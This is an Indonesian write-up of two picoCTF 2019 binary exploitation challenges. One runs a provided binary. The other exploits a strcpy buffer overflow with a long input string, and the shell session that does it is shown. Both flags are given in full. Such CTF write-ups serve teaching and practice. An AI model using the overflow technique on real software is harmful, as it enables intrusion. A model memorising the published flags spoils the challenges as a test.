# Binary Exploitation

## Penulis: [ahm4ddm](https://github.com/ahm4ddm)
## Daftar Isi:

| Binary Exploitation  |
| ------------- |
| [practice-run-1](#1-practice-run-1-50)|
| [OverFlow-0](#2-OverFlow-0-100)|


---
## 1. practice-run-1 (50)

### Soal:
You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this [program](https://2019shell1.picoctf.com/static/6eba3b66e7a2b786c6c9769711d85663/run_this) to receive a flag.
    
### Pembahasan:
Pertama, kita analisis dulu jenis filenya menggunakan perintah *file*
```
$file run_this
run_this: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=49eb1de81288cfa7d67445c1b3c79ecbdf91a359, not stripped

```
hint dari soal yaitu jalankan program.
```
$./run_this
bash: ./run_this: Permission denied
```
ganti hak akses dengan perintah 
```
$chmod +x run_this

```
lalu jalankan program. flag akan tampil.
```
$./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```
Sebenarnya ada cara lain yaitu dengan perintah *strings* dimana dengan perintah itu akan menampilkan seluruh strings yang ada di program.
```
$strings run_this
...
...
picoCTF{g3t_r3adY_2_r3v3r53}
...
...

```
<details>
	<summary>Flagnya</summary>

	picoCTF{g3t_r3adY_2_r3v3r53}

</details>  

## 2. OverFlow 0 (100)

### Soal:
This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/2d0dd1f54c7e90ca426daa027152b01d/vuln) and get a flag. Its also found in /problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6 on the shell server. [Source](https://2019shell1.picoctf.com/static/2d0dd1f54c7e90ca426daa027152b01d/vuln.c).

### Penyelesaian:
kita download source code dulu. setelah dianalisis program meminta inputan dari kita. serta program ukuran 32bit.

yang menarik dari source code adalah
```
void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

```
panjang array char buf didefinisikan sebagai 128, jadi jika didalam memori sebesar 128 byte. disini terdapat bug yaitu *strcpy* dimana bug itu tidak mengecek ukuran array, maka bisa terjadi overflow. dalam kasus ini kita bisa melakukan overflow untuk mendapatkan flag.
kita buat inputan sebanyak 129 + 4 = 133.   
kenapa ditambah 4? karena programnya 32bit.
kita login di shell [picoctf](https://2019webshell1.picoctf.com)
```
ahm4d@pico-2019-shell1:~$ cd /problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6
ahm4d@pico-2019-shell1:/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6$ ls -la
total 92
drwxr-xr-x   2 root       root          4096 Sep 28  2019 .
drwxr-x--x 684 root       root         69632 Oct 10  2019 ..
-r--r-----   1 hacksports overflow-0_5    27 Sep 28  2019 flag.txt
-rwxr-sr-x   1 hacksports overflow-0_5  7644 Sep 28  2019 vuln
-rw-rw-r--   1 hacksports hacksports     814 Sep 28  2019 vuln.c
ahm4d@pico-2019-shell1:/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6$ ./vuln aaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabi
picoCTF{3asY_P3a5y4a888b8e}
```
<details>
	<summary>Flagnya</summary>

	picoCTF{3asY_P3a5y4a888b8e}

</details>  

